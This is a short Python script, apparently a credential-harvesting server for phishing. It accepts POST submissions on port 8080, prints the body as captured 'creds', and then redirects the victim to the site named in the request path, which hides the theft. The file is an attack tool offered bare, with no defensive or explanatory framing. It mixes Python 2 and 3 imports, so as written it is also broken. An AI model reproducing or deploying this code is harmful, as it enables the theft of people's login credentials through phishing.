#!/usr/bin/env python
import http.server
import SocketServer
import urllib

class CredRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('utf8')
        print(creds)
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.unquote(site))
        self.end_headers()

server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()
